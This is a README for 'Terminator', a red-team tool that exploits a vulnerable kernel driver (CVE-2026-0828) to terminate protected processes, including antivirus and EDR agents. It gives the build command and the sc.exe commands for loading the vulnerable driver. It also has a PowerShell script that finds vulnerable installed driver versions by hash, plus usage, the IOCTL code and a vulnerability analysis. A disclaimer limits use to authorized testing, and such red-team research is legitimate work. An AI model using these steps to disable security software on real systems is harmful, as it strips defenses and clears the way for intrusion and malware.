# Terminator - Red Team Process Killer

A kernel-mode process termination tool leveraging a vulnerable driver (CVE-2026-0828) to kill protected processes from user mode.

## Compilation

Requires MinGW-w64 (GCC) on Windows. Compile with:

```powershell
g++ --% .\terminator.cpp -o terminator.exe -Oz -ffunction-sections -fdata-sections -static -static-libgcc -static-libstdc++ -Wl,--gc-sections -W
```

Flags breakdown:
| Flag | Purpose |
|------|---------|
| `--%` | PowerShell stop-parsing token (passes args literally to g++) |
| `-Oz` | Optimize for minimum size |
| `-ffunction-sections` / `-fdata-sections` | Place each function/data in separate section |
| `-static` / `-static-libgcc` / `-static-libstdc++` | Static linking (no runtime DLL dependencies) |
| `-Wl,--gc-sections` | Linker garbage-collects unused sections |
| `-W` | Enable warnings |

Output: standalone `terminator.exe` (~20-30 KB stripped).

## Technical Focus

This project demonstrates exploitation of a vulnerable kernel driver (`STProcessMonitorDriver`) that exposes an unvalidated `IOCTL_KILL_PROCESS` handler, allowing arbitrary process termination regardless of privileges or protection mechanisms (PPL, EPROCESS flags, etc.).

### Architecture Breakdown

| Component | Purpose |
|-----------|---------|
| `terminator.cpp` | User-mode client that enumerates processes and sends kill IOCTLs |
| `terminator.hpp` | Class interface for process enumeration and termination |
| `ProcessMonitorDriver.sys` | Vulnerable kernel driver (external, not included) |

### Code Analysis

**`Terminator::GetProcessPids()`**
- Creates a snapshot via `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)`
- Iterates all processes with `Process32First`/`Process32Next`
- Case-insensitive matches against target process names
- Returns vector of matching PIDs

**`Terminator::ProcessKill()`**
- Opens handle to `\\.\STProcessMonitorDriver`
- Enters infinite monitoring loop (500ms interval)
- For each discovered PID, sends `IOCTL_KILL_PROCESS (0xB822200C)` with 8-byte PID buffer
- No output when processes not found; logs only on kill attempts

## Usage Guide

### Prerequisites

Load the vulnerable driver (requires Administrator):

```cmd
sc.exe create STProcessMonitor type=kernel binPath=C:\Path\To\Driver\ProcessMonitorDriver.sys
sc.exe start STProcessMonitor
```

### Exploiting an Existing Service

If a vulnerable version of `ProcessMonitorDriver.sys` is already installed and running as a service (e.g., from a legitimate application), Terminator can connect directly without loading a new driver.

**Check if the service exists and is running:**
```cmd
sc.exe query STProcessMonitor
```

**Verify the driver version is vulnerable (PowerShell):**
```powershell
$driverPath = "C:\Windows\System32\drivers\ProcessMonitorDriver.sys"
if (Test-Path $driverPath) {
    $hash = (Get-FileHash $driverPath -Algorithm SHA256).Hash.ToLower()
    $vulnerableHashes = @(
        "70bcec00c215fe52779700f74e9bd669ff836f594df92381cbfb7ee0568e7a8b",  # 11.11.4.0
        "85d21ad0e0b43d122f3c9ec06036b08398635860c93d764f72fb550fb44cf786"   # 10.5.75.0
    )
    if ($vulnerableHashes -contains $hash) {
        Write-Host "[+] Vulnerable driver detected (SHA256: $hash)" -ForegroundColor Green
        Write-Host "[+] You can simply run Terminator." -ForegroundColor Green
    } else {
        Write-Host "[-] Driver found but not a known vulnerable version (SHA256: $hash)" -ForegroundColor Yellow
    }
} else {
    Write-Host "[-] Driver not found at $driverPath" -ForegroundColor Red
}
```

If the service exists and is `RUNNING` with a vulnerable version, skip the driver load steps and run Terminator directly.

### Affected Versions (Tested)

| Version | SHA-256 |
|---------|---------|
| 11.11.4.0 | `70bcec00c215fe52779700f74e9bd669ff836f594df92381cbfb7ee0568e7a8b` |
| 10.5.75.0 | `85d21ad0e0b43d122f3c9ec06036b08398635860c93d764f72fb550fb44cf786` |

Other versions may be affected; verify the driver's IOCTL handler before use.

### Run Terminator

```cmd
terminator.exe -proc <process_name1> [process_name2] ...
```

Example:
```cmd
terminator.exe -proc notepad.exe calc.exe
```

### Output

```
[+] Connected to driver. Monitoring for processes...
[*] Sending IOCTL 0xB822200C to terminate PID 4188...
[+] Success! IOCTL sent for PID 4188.
```

## CVE-2026-0828 Analysis

**Vulnerability**: The driver `STProcessMonitorDriver` registers an IOCTL handler (`0xB822200C`) that:
1. Accepts a user-supplied 64-bit PID as input buffer
2. Performs **no validation** on the PID value
3. Calls `PsLookupProcessByProcessId` → `ZwTerminateProcess` directly
4. Runs in kernel context (`SYSTEM` token), bypassing all user-mode ACLs

**Impact**: Any non-admin user with driver access can terminate:
- Protected Processes (PPL)
- Antivirus/EDR agents
- Critical system processes (csrss, winlogon, etc.)
- Processes with `SeDebugPrivilege` requirements

**Root Cause**: Missing `ObReferenceObjectByHandle` validation, no `SeSinglePrivilegeCheck(SeDebugPrivilege)`, and no process object access checks.

## Disclaimer

> **This tool is for authorized security research and red team exercises only.**
>
> Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse. Ensure you have written authorization before deploying in any environment.
>
> The vulnerable driver (`ProcessMonitorDriver.sys`) is intentionally flawed for demonstration purposes and should **never** be deployed in production.